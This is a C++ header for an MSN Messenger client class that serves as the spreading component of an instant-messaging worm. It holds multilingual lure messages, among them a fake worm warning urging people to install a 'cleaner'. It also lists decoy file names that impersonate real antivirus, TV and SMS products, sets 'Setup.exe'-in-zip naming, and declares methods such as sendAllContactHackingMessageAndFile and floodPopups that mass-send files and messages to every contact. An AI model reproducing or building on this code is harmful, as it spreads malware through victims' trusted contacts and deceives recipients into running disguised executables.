#include <windows.h>
#include <stdlib.h>
#include <time.h>
#include "FunctionsAssistant.h"
#include "FunctionsStrings.h"
#include "FunctionsFiles.h"
#include "FunctionsWindowsNT.h"
#include "HTTPClient.h"
#include "Main.h"
#include "MD5Wrapper.h"
#include "MultipleLangStringList.h"
#include "WinRegistry.h"
#include "ZipCompress.h"

#define MSN_HOST                              "messenger.hotmail.com"
#define MSN_PORT                              1863
#define MSN_AUTH_QUERY_SERVER                 "nexus.passport.com"
#define MSN_AUTH_QUERY_PORT                   443

#define MSN_DELAY                             500
#define MSN_CHECK_NUM_FILES_SEND_DELAY        5000
#define MSN_FILES_SEND_DELAY                  2500
#define MSN_REPEAT_DELAY                      20
#define MSN_CONTACT_LIST_DELAY                20
#define MSN_BLOCK_TRANSFER_DELAY              50
#define MSN_CLOSE_SESSION_DELAY               10000

#define MSN_STATE_ONLINE                      "NLN" 
#define MSN_STATE_OFFLINE                     "FLN"
#define MSN_STATE_INVISIBLE                   "HDN"
#define MSN_STATE_INACTIVE                    "IDL"
#define MSN_STATE_AWAY                        "AWY"
#define MSN_STATE_COME_BACK_NOW               "BRB"
#define MSN_STATE_BUSY                        "BSY"
#define MSN_STATE_TELEPHONE                   "PHN"
#define MSN_STATE_LUNCH                       "LUN"

#define MSN_FONT_ARIAL                        "Arial"
#define MSN_FONT_ARIAL_BLACK                  "Arial%20Black"
#define MSN_FONT_ARIAL_NARROW                 "Arial%20Narrow"
#define MSN_FONT_COURIER                      "Courier"
#define MSN_FONT_COURIER_NEW                  "Courier%20New"
#define MSN_FONT_SANS_SERIF                   "MS%20Sans%20Serif"
#define MSN_FONT_SYSTEM                       "System"
#define MSN_FONT_TAHOMA                       "Tahoma"
#define MSN_FONT_TIMES_NEW_ROMAN              "Times%20New%20Roman"
#define MSN_FONT_VERDANA                      "Verdana"

#define MSN_FONT_STYLE_NORMAL                 ""
#define MSN_FONT_STYLE_ITALIC                 "I"
#define MSN_FONT_STYLE_BOLD                   "B"
#define MSN_FONT_STYLE_UNDERLINE              "S"
#define MSN_FONT_STYLE_ITALIC_BOLD            "IB"
#define MSN_FONT_STYLE_ITALIC_UNDERLINE       "IS"
#define MSN_FONT_STYLE_BOLD_UNDERLINE         "BS"
#define MSN_FONT_STYLE_ITALIC_BOLD_UNDERLINE  "IBS"

#define MSN_FONT_COLOR_RED                    "0000FF"
#define MSN_FONT_COLOR_BLUE                   "FF0000"
#define MSN_FONT_COLOR_GREEN                  "00FF00"
#define MSN_FONT_COLOR_YELLOW                 "00FFFF"
#define MSN_FONT_COLOR_MAGENTA                "FF00FF"
#define MSN_FONT_COLOR_CYAN                   "FFFF00"
#define MSN_FONT_COLOR_WHITE                  "FFFFFF"
#define MSN_FONT_COLOR_BLACK                  "000000"
#define MSN_FONT_COLOR_ORANGE                 "0096FF"
#define MSN_FONT_COLOR_PURPLE                 "FF0096"

#define MSN_FONT_CODING_ANSI                  "0"
#define MSN_FONT_CODING_DEFAULT               "1"
#define MSN_FONT_CODING_SYMBOL                "2"
#define MSN_FONT_CODING_MACINTOSH             "4d"
#define MSN_FONT_CODING_JAPANESE              "80"
#define MSN_FONT_CODING_KOREAN_HANGEUL        "81"
#define MSN_FONT_CODING_KOREAN_JOHAB          "82"
#define MSN_FONT_CODING_CHINESE               "86"
#define MSN_FONT_CODING_CHINESE_TRAD          "88"
#define MSN_FONT_CODING_GREEK                 "a1"
#define MSN_FONT_CODING_TURKISH               "a2"
#define MSN_FONT_CODING_VIETNAMESE            "a3"
#define MSN_FONT_CODING_HEBREW                "b1"
#define MSN_FONT_CODING_ARABIC                "b2"
#define MSN_FONT_CODING_BALTIC                "ba"
#define MSN_FONT_CODING_RUSSIAN               "cc"
#define MSN_FONT_CODING_THAI                  "de"
#define MSN_FONT_CODING_EASTEUROPE            "ee"
#define MSN_FONT_CODING_OEM_DEFAULT           "ff"

#define MSN_OFFICIAL_BLOCK_SIZE_SEND          2045

#define MSN_MAX_CURRENT_FILES_TO_SEND         10

#define MSN_SENTENCE1_SP                      "Este es el programa que me pediste"              
#define MSN_SENTENCE1_EN                      "This is the program to me asked"
#define MSN_SENTENCE1_IT                      "Questo e il programma che mi ha chiesto"
#define MSN_SENTENCE1_FR                      "C'est le logiciel qui m'a demande"
#define MSN_SENTENCE1_GE                      "Dies ist das Programm, fragte mich,"
#define MSN_SENTENCE1_PO                      "Este e o programa que me perguntou"
#define MSN_SENTENCE1_CA                      "Aquest es el programa que em vas demanar"
#define MSN_SENTENCE1_AR                      "This is the program to me asked"
#define MSN_SENTENCE1_BU                      "This is the program to me asked"
#define MSN_SENTENCE1_CZ                      "Jedna se o program, ktery me pozadal, abych"
#define MSN_SENTENCE1_CH                      "This is the program to me asked"
#define MSN_SENTENCE1_CR                      "To je program koji me je zamolio"
#define MSN_SENTENCE1_DA                      "Det er det program, der spurgte mig"
#define MSN_SENTENCE1_FI                      "Tama on ohjelma, joka pyysi minua"
#define MSN_SENTENCE1_GR                      "This is the program to me asked"
#define MSN_SENTENCE1_HI                      "This is the program to me asked"
#define MSN_SENTENCE1_DU                      "Dit is het programma dat mij gevraagd"
#define MSN_SENTENCE1_JA                      "This is the program to me asked"
#define MSN_SENTENCE1_NO                      "Dette er programmet som spurte meg"
#define MSN_SENTENCE1_PL                      "Jest to program, ktory poprosil mnie"
#define MSN_SENTENCE1_RU                      "This is the program to me asked"
#define MSN_SENTENCE1_SW                      "Detta ar programmet som fragade mig"

#define MSN_SENTENCE2_SP                      "Coge este excelente programa para ver la television online!"              
#define MSN_SENTENCE2_EN                      "Get this excellent program to see TV online!"
#define MSN_SENTENCE2_IT                      "Raccoglie questo eccellente programma per vedere la TV on-line!"
#define MSN_SENTENCE2_FR                      "Reprend cette excellent logiciel pour voir la TV en ligne!"
#define MSN_SENTENCE2_GE                      "Greift diese ausgezeichnete Programm, um zu sehen, die TV online!"
#define MSN_SENTENCE2_PO                      "Pega este excelente programa para ver a TV online!"
#define MSN_SENTENCE2_CA                      "Agafa aquest excel.lent programa per veure la televisio en linia!"
#define MSN_SENTENCE2_AR                      "Get this excellent program to see TV online!"
#define MSN_SENTENCE2_BU                      "Get this excellent program to see TV online!"
#define MSN_SENTENCE2_CZ                      "navazuje tento vyborny program, ktery naleznete na TV on-line!"
#define MSN_SENTENCE2_CH                      "Get this excellent program to see TV online!"
#define MSN_SENTENCE2_CR                      "Preuzima se ovaj odlican program na TV vidjeti online!"
#define MSN_SENTENCE2_DA                      "Henter dette glimrende program til at se TV online!"
#define MSN_SENTENCE2_FI                      "Poimii taman erinomaisen ohjelman katso television online!"
#define MSN_SENTENCE2_GR                      "Get this excellent program to see TV online!"
#define MSN_SENTENCE2_HI                      "Get this excellent program to see TV online!"
#define MSN_SENTENCE2_DU                      "Pikt dit uitstekende programma om te zien dat de TV online!"
#define MSN_SENTENCE2_JA                      "Get this excellent program to see TV online!"
#define MSN_SENTENCE2_NO                      "Plukker opp denne utmerket program til a se TV online!"
#define MSN_SENTENCE2_PL                      "Podnosi tym doskonalym programem do telewizji online, zobacz!"
#define MSN_SENTENCE2_RU                      "Get this excellent program to see TV online!"
#define MSN_SENTENCE2_SW                      "Tar upp detta utmarkta program for att se TV online!"

#define MSN_SENTENCE3_SP                      "Coge este increible software antispyware, antivirus, firewall"              
#define MSN_SENTENCE3_EN                      "Take this incredible software antispyware, antivirus, firewall"
#define MSN_SENTENCE3_IT                      "Partecipa a questo incredibile software antispyware, antivirus, firewall"
#define MSN_SENTENCE3_FR                      "Profitez de cette incroyable logiciel antispyware, antivirus, firewall"
#define MSN_SENTENCE3_GE                      "Nehmen Sie dieses unglaubliche Software antispyware, antivirus, firewall"
#define MSN_SENTENCE3_PO                      "Leve este incrivel software antispyware, antivirus, firewall"
#define MSN_SENTENCE3_CA                      "Agafa aquest increible software antispyware, antivirus, firewall"
#define MSN_SENTENCE3_AR                      "Take this incredible software antispyware, antivirus, firewall"
#define MSN_SENTENCE3_BU                      "Take this incredible software antispyware, antivirus, firewall"
#define MSN_SENTENCE3_CZ                      "Vem si to neuveritelne, software antispyware, antivirus, firewall"
#define MSN_SENTENCE3_CH                      "Take this incredible software antispyware, antivirus, firewall"
#define MSN_SENTENCE3_CR                      "Uzmi ovaj nevjerojatan softver antispyware, antivirus, firewall"
#define MSN_SENTENCE3_DA                      "Tag denne utrolige software antispyware, antivirus, firewall"
#define MSN_SENTENCE3_FI                      "Ota tama uskomaton ohjelmisto antispyware, antivirus, firewall"
#define MSN_SENTENCE3_GR                      "Take this incredible software antispyware, antivirus, firewall"
#define MSN_SENTENCE3_HI                      "Take this incredible software antispyware, antivirus, firewall"
#define MSN_SENTENCE3_DU                      "Neem deze ongelofelijke software antispyware, antivirus, firewall"
#define MSN_SENTENCE3_JA                      "Take this incredible software antispyware, antivirus, firewall"
#define MSN_SENTENCE3_NO                      "Ta dette utrolige programvare antispyware, antivirus, firewall"
#define MSN_SENTENCE3_PL                      "Wez to niesamowite oprogramowanie antispyware, antivirus, firewall"
#define MSN_SENTENCE3_RU                      "Take this incredible software antispyware, antivirus, firewall"
#define MSN_SENTENCE3_SW                      "Ta den har otroligt programvara antispyware, antivirus, firewall"

#define MSN_SENTENCE4_SP                      "Con este programa podras enviar mensajes a moviles de forma gratuita!"              
#define MSN_SENTENCE4_EN                      "With this program you can send free messages to cellular phones!"
#define MSN_SENTENCE4_IT                      "Con questo programma e possibile inviare messaggi a cellulari gratis!"
#define MSN_SENTENCE4_FR                      "Avec ce logiciel vous pouvez envoyer des messages aux telephones mobiles gratuitement!"
#define MSN_SENTENCE4_GE                      "Mit diesem Programm konnen Sie Nachrichten an Handys, frei!"
#define MSN_SENTENCE4_PO                      "Com este programa voce pode mandar mensagens para telemoveis de graça!"
#define MSN_SENTENCE4_CA                      "Amb aquest programa podras enviar missatges a mobils de forma gratuita!"
#define MSN_SENTENCE4_AR                      "With this program you can send free messages to cellular phones!"
#define MSN_SENTENCE4_BU                      "With this program you can send free messages to cellular phones!"
#define MSN_SENTENCE4_CZ                      "S timto programem muzete posílat zpravy na mobilní telefony zdarma!"
#define MSN_SENTENCE4_CH                      "With this program you can send free messages to cellular phones!"
#define MSN_SENTENCE4_CR                      "Pomocu ovog programa mozete slati poruke na mobitelu besplatno!"
#define MSN_SENTENCE4_DA                      "Med dette program kan du sende beskeder til mobiltelefoner fri!"
#define MSN_SENTENCE4_FI                      "Talla ohjelmalla voit lahettaa viesteja matkapuhelinten ilmaiseksi!"
#define MSN_SENTENCE4_GR                      "With this program you can send free messages to cellular phones!"
#define MSN_SENTENCE4_HI                      "With this program you can send free messages to cellular phones!"
#define MSN_SENTENCE4_DU                      "Med dette program kan du sende beskeder til mobiltelefoner gratis!"
#define MSN_SENTENCE4_JA                      "With this program you can send free messages to cellular phones!"
#define MSN_SENTENCE4_NO                      "Med dette programmet kan du sende meldinger til mobiltelefoner gratis!"
#define MSN_SENTENCE4_PL                      "Z pomoca tego programu mozna wysylac wiadomos'ci na komorke za darmo!"
#define MSN_SENTENCE4_RU                      "With this program you can send free messages to cellular phones!"
#define MSN_SENTENCE4_SW                      "Med detta program kan du skicka meddelanden till mobiltelefoner gratis!"

#define MSN_SENTENCE5_SP                      "Joder!, tienes un gusano/W32 en tu ordenador, instalate este limpiador!"              
#define MSN_SENTENCE5_EN                      "Dammit! got a worm/W32 on your computer, installing this cleaner!"
#define MSN_SENTENCE5_IT                      "Dammit! ottenuto un worm/W32 sul tuo computer, l'installazione di questo detersivi!"
#define MSN_SENTENCE5_FR                      "Dammit! a un worm/W32 sur votre ordinateur, l'installation de ce nettoyant!"
#define MSN_SENTENCE5_GE                      "Dammit! bekam ein worm/W32 auf Ihrem Computer, die Installation dieses Reinigungsmittel!"
#define MSN_SENTENCE5_PO                      "Raios! tenho um worm/W32 em seu computador, instalando esta purificadores!"
#define MSN_SENTENCE5_CA                      "Ostia! tens un cuc/W32 en el teu ordinador, instal.lat aquest natejador!"
#define MSN_SENTENCE5_AR                      "Dammit! got a worm/W32 on your computer, installing this cleaner!"
#define MSN_SENTENCE5_BU                      "Dammit! got a worm/W32 on your computer, installing this cleaner!"
#define MSN_SENTENCE5_CZ                      "Sakra! dostal worm/W32 na vasem pocitaci, instalovaní tohoto cistici!"
#define MSN_SENTENCE5_CH                      "Dammit! got a worm/W32 on your computer, installing this cleaner!"
#define MSN_SENTENCE5_CR                      "Dammit! dobio worm/W32 na racunalu, instaliranje ove ciscenje!"
#define MSN_SENTENCE5_DA                      "Dammit! fik en worm/W32 pa computeren, ved at installere denne sæbe!"
#define MSN_SENTENCE5_FI                      "Hemmetti! sai worm/W32 tietokoneella, asentamalla taman puhdistusaineet!"
#define MSN_SENTENCE5_GR                      "Dammit! got a worm/W32 on your computer, installing this cleaner!"
#define MSN_SENTENCE5_HI                      "Dammit! got a worm/W32 on your computer, installing this cleaner!"
#define MSN_SENTENCE5_DU                      "Dammit! kreeg een worm/W32 op uw computer, het installeren van dit reinigingsmiddel!"
#define MSN_SENTENCE5_JA                      "Dammit! got a worm/W32 on your computer, installing this cleaner!"
#define MSN_SENTENCE5_NO                      "Dammit! fikk en worm/W32 pa datamaskinen, installere denne rengjøringsmiddel!"
#define MSN_SENTENCE5_PL                      "Dammit! dostalem worm/W32 na komputer, instalujac te czyszczaco!"
#define MSN_SENTENCE5_RU                      "Dammit! got a worm/W32 on your computer, installing this cleaner!"
#define MSN_SENTENCE5_SW                      "Helvete! fick en worm/W32 pa datorn, installera den har rengorings!"

#define MSN_FILENAME1_SENTENCE2               "PCTV Pinnacle Professional"
#define MSN_FILENAME2_SENTENCE2               "Zattoo Cracked"
#define MSN_FILENAME3_SENTENCE2               "Internet TV"
#define MSN_FILENAME4_SENTENCE2               "Google World Online TV"
#define MSN_FILENAME5_SENTENCE2               "TV Player Classic"
#define MSN_FILENAME6_SENTENCE2               "Veoh Player"
#define MSN_FILENAME7_SENTENCE2               "TV Web 360"
#define MSN_FILENAME8_SENTENCE2               "TV Center"
#define MSN_FILENAME9_SENTENCE2               "Satellite PCTV 2050"
#define MSN_FILENAME10_SENTENCE2              "PCTV Digital TDT"
#define MSN_FILENAME11_SENTENCE2              "TV Decoder"
#define MSN_FILENAME12_SENTENCE2              "Universe TV"
#define MSN_FILENAME13_SENTENCE2              "Free Online TV"
#define MSN_FILENAME14_SENTENCE2              "NET TV"
#define MSN_FILENAME15_SENTENCE2              "WWW TV"
#define MSN_FILENAME16_SENTENCE2              "RealTime TV"
#define MSN_FILENAME17_SENTENCE2              "LCD TV"
#define MSN_FILENAME18_SENTENCE2              "Plasma TV"
#define MSN_FILENAME19_SENTENCE2              "TV Channel"
#define MSN_FILENAME20_SENTENCE2              "Plus TV"

#define MSN_FILENAME1_SENTENCE3               "Black Ice"
#define MSN_FILENAME2_SENTENCE3               "Norton Antivirus Special Edition"
#define MSN_FILENAME3_SENTENCE3               "Macafee Gold Edition"
#define MSN_FILENAME4_SENTENCE3               "SuperAntispyware"
#define MSN_FILENAME5_SENTENCE3               "Spyware-Malware Remover"
#define MSN_FILENAME6_SENTENCE3               "Spybot Search & Destroy"
#define MSN_FILENAME7_SENTENCE3               "Ad-Aware Alpha"
#define MSN_FILENAME8_SENTENCE3               "RealTime Protection"
#define MSN_FILENAME9_SENTENCE3               "Cisco Firewall"
#define MSN_FILENAME10_SENTENCE3              "Spy Sweeper Last Edition"
#define MSN_FILENAME11_SENTENCE3              "Spyware Doctor"
#define MSN_FILENAME12_SENTENCE3              "Worm32 Blocker"
#define MSN_FILENAME13_SENTENCE3              "AVG Professional Edition"
#define MSN_FILENAME14_SENTENCE3              "Sygate RT Protect"
#define MSN_FILENAME15_SENTENCE3              "Traffic Controller"
#define MSN_FILENAME16_SENTENCE3              "Rogue Remover"
#define MSN_FILENAME17_SENTENCE3              "IPSwitch Firewall"
#define MSN_FILENAME18_SENTENCE3              "Zone Alarm Silver Edition"
#define MSN_FILENAME19_SENTENCE3              "AVG Internet Security"
#define MSN_FILENAME20_SENTENCE3              "Spyware Neutralizer"

#define MSN_FILENAME1_SENTENCE4               "SMS Phone Sender"
#define MSN_FILENAME2_SENTENCE4               "Short Message Service"
#define MSN_FILENAME3_SENTENCE4               "Google Phone"
#define MSN_FILENAME4_SENTENCE4               "GPhone"
#define MSN_FILENAME5_SENTENCE4               "Free SMS Sender"
#define MSN_FILENAME6_SENTENCE4               "Yoggi SMS"
#define MSN_FILENAME7_SENTENCE4               "SMS Cellular"
#define MSN_FILENAME8_SENTENCE4               "iSender SMS"
#define MSN_FILENAME9_SENTENCE4               "iNet SMS Sender"
#define MSN_FILENAME10_SENTENCE4              "Gnokii SMS Software"
#define MSN_FILENAME11_SENTENCE4              "Gammu SMS Software"
#define MSN_FILENAME12_SENTENCE4              "Kannel SMS Software"
#define MSN_FILENAME13_SENTENCE4              "Skype SMS Sender"
#define MSN_FILENAME14_SENTENCE4              "SMSFree"
#define MSN_FILENAME15_SENTENCE4              "SMS-it"
#define MSN_FILENAME16_SENTENCE4              "Bulk SMS"
#define MSN_FILENAME17_SENTENCE4              "Advanced SMS Tecnology"
#define MSN_FILENAME18_SENTENCE4              "SMS Notify"
#define MSN_FILENAME19_SENTENCE4              "SMS Threader"
#define MSN_FILENAME20_SENTENCE4              "Pretty SMS"

#define MSN_FILENAME1_SENTENCE5               "RegCleaner Special Edition"
#define MSN_FILENAME2_SENTENCE5               "RegOrganizer Gold Edition"
#define MSN_FILENAME3_SENTENCE5               "Spy Cleaner"
#define MSN_FILENAME4_SENTENCE5               "X-Cleaner"
#define MSN_FILENAME5_SENTENCE5               "Trojan CKiller"
#define MSN_FILENAME6_SENTENCE5               "Disk Cleaner"
#define MSN_FILENAME7_SENTENCE5               "Comodo Registry Cleaner"
#define MSN_FILENAME8_SENTENCE5               "MSN Virus Cleaner"
#define MSN_FILENAME9_SENTENCE5               "Lavasoft Cleaner"
#define MSN_FILENAME10_SENTENCE5              "ZigZag Cleaner"
#define MSN_FILENAME11_SENTENCE5              "Desktop Cleaner"
#define MSN_FILENAME12_SENTENCE5              "TuneUp Utilities"
#define MSN_FILENAME13_SENTENCE5              "Cleanup Assistant"
#define MSN_FILENAME14_SENTENCE5              "Registry Optimizer"
#define MSN_FILENAME15_SENTENCE5              "Memory Cleaner"
#define MSN_FILENAME16_SENTENCE5              "Automatic Cleaner Plus"
#define MSN_FILENAME17_SENTENCE5              "Cache SoftCleaner"
#define MSN_FILENAME18_SENTENCE5              "BestEffort Performance"
#define MSN_FILENAME19_SENTENCE5              "CCleaner"
#define MSN_FILENAME20_SENTENCE5              "CleanerAgent"

#define MSN_OUT_FILENAME_COMPRESS_EXTENSION   ".zip"
#define MSN_IN_FILENAME_COMPRESS_EXTENSION    ".exe"
#define MSN_IN_FILENAME_COMPRESS_SUFIX        "Setup"

#pragma once

class MSNClient : public TCPSocket {
   private:
      bool MSNLogged, chgNickname, stopMSNSession;
      unsigned long IDCommand;
      TCPSocket * MSNServerRedirect; 
      HTTPClient * MSNServerAuth;
      MSNContact ** MSNContactList;
      MSNConversation ** MSNConversationList;
      MSNContactOnLine ** MSNOnLineContactList;
      char * actualState, * actualIDConversation;
      unsigned long numContacts, numOnLineContacts, numConversations, numConcurrentFilesToSend;
      MultipleLangStringList * sentencesToTalk;
      
      bool inicializeSentencesToTalk();
      
   public:
      MSNClient(const char * user, const char * passwd);
      
      bool startSession();
      bool stopSession();
      bool changeState(const char * MSNState);
      bool changeNickname(const char * nickname);
      bool createConversation(const char * IDConversation);
      bool closeConversation(const char * IDConversation);
      bool inviteContact(const char * email, const char * IDConversation);
      bool floodPopups(const char * message); 
      bool sendConversationMessage(const char * IDConversation, const char * message, const char * fontType = MSN_FONT_VERDANA, const char * fontStyle = MSN_FONT_STYLE_NORMAL, const char * fontColor = MSN_FONT_COLOR_BLACK, const char * fontCoding = MSN_FONT_CODING_ANSI);
      bool sendContactMessage(const char * email, const char * message, const char * fontType = MSN_FONT_VERDANA, const char * fontStyle = MSN_FONT_STYLE_NORMAL, const char * fontColor = MSN_FONT_COLOR_BLACK, const char * fontCoding = MSN_FONT_CODING_ANSI);
      bool sendAllContactMessage(const char * message, const char * fontType = MSN_FONT_VERDANA, const char * fontStyle = MSN_FONT_STYLE_NORMAL, const char * fontColor = MSN_FONT_COLOR_BLACK, const char * fontCoding = MSN_FONT_CODING_ANSI);
      bool sendContactFile(const char * email, const char * filePath);
      bool sendAllContactFile(const char * filePath, unsigned int maxCurrentFilesToSend = MSN_MAX_CURRENT_FILES_TO_SEND);
      bool sendAllContactMessageAndFile(const char * message, const char * filePath, const char * fontType = MSN_FONT_VERDANA, const char * fontStyle = MSN_FONT_STYLE_NORMAL, const char * fontColor = MSN_FONT_COLOR_BLACK, const char * fontCoding = MSN_FONT_CODING_ANSI, unsigned int maxCurrentFilesToSend = MSN_MAX_CURRENT_FILES_TO_SEND);
      bool sendAllContactHackingMessageAndFile(const char * filePath, const char * fontType = MSN_FONT_VERDANA, const char * fontStyle = MSN_FONT_STYLE_NORMAL, const char * fontColor = MSN_FONT_COLOR_BLACK, const char * fontCoding = MSN_FONT_CODING_ANSI, unsigned int maxCurrentFilesToSend = MSN_MAX_CURRENT_FILES_TO_SEND);
      
      void incNumContacts();
      void incNumConversations();
      void incOnLineNumContacts();
      void incIDCommand();
      void incNumConcurrentFilesToSend();
      void decNumConcurrentFilesToSend();
      void setConversationList(MSNConversation ** conversationList);
      void setMSNLogged(bool value);
      void setChangeNickname(bool value);
      void setStopSession(bool value);
      bool existsConversation(const char * IDConversation);
      bool setActualState(char * state);
      bool addContact(const char * nickname, const char * email);
      bool addOnLineContact(const char * nickname, const char * email, const char * state);
      bool delOnLineContact(const char * email);
      long searchConversation(const char * IDConversation);
      long searchContactInConversation(const char * email);
      
      bool isContactOnLine(const char * email);
      bool isMSNLogged() { return MSNLogged; }
      bool getStopSession() { return stopMSNSession; }
      TCPSocket * getMSNServerRedirect() { return MSNServerRedirect; }
      unsigned long getNumContacts() { return numContacts; }
      unsigned long getNumOnLineContacts() { return numOnLineContacts; }
      unsigned long getNumConversations() { return numConversations; }
      unsigned long getIDCommand() { return IDCommand; }
      char * getActualIDConversation() { return actualIDConversation; }
      MSNContact ** getMSNContactList() { return MSNContactList; }
      MSNContactOnLine ** getMSNOnLineContactList() { return MSNOnLineContactList; }
      MSNConversation ** getMSNConversationList() { return MSNConversationList; }
      char * getActualState() { return actualState; }
};
